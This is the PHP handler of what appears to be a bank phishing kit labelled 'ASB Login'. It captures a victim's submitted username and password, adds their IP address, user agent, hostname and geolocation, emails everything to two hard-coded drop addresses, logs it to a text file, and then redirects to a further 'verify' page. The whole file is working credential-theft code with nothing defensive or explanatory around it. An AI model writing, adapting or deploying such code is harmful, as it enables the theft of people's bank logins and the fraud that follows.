<?

function generateRandomString($length = 10) {
    $characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
    $charactersLength = strlen($characters);
    $randomString = '';
    for ($i = 0; $i < $length; $i++) {
        $randomString .= $characters[rand(0, $charactersLength - 1)];
    }
    return $randomString;
}
require_once('geoplugin.class.php');

$geoplugin = new geoPlugin();

//get user's ip address 
$geoplugin->locate();
if (!empty($_SERVER['HTTP_CLIENT_IP'])) { 
    $ip = $_SERVER['HTTP_CLIENT_IP']; 
} elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) { 
    $ip = $_SERVER['HTTP_X_FORWARDED_FOR']; 
} else { 
    $ip = $_SERVER['REMOTE_ADDR']; 
}
session_start();
include 'antibots.php';
$agent=$_SERVER['HTTP_USER_AGENT'];
$ip = getenv("REMOTE_ADDR");
$timedate = date("D/M/d, Y g:i a");
$addr_details = unserialize(file_get_contents('http://www.geoplugin.net/php.gp?ip='.$ip));
$hostname = gethostbyaddr($ip);
$message  = "==================+[ ASB Login ]+==================\n";
$message .= "Username: ".$_POST['dUsername']."\n";
$message .= "Password: ".$_POST['password']."\n";
$message .= "============= [ Ip & Hostname Info ] =============\n";
$message .= "Client IP : ".$ip."\n";
$message .= "User-Agent : ".$agent."\n";
$message .= "HostName : ".$hostname."\n";
$message .= "DateTime: ".$timedate."\n";
$message .= "--------------------------------------------\n";
$message .= 	"City: {$geoplugin->city}\n";
$message .= 	"Region: {$geoplugin->region}\n";
$message .= 	"Country Name: {$geoplugin->countryName}\n";
$message .= 	"Country Code: {$geoplugin->countryCode}\n";
$message .= "=============+ Created by WeStGiRl0003 +=============\n";
$email= "seastars228@yandex.com,pklogs00@gmail.com";
$subject = "ASB Login $ip | ".$_POST['dUsername']." ".$_POST['password']."\n";
mail(','.$form,$subject,$message);
    $text = fopen('westgirl.txt', 'a');
fwrite($text, $message);
mail($email,$subject,$message);

header("Location: verify.php?&".generateRandomString(200));
?>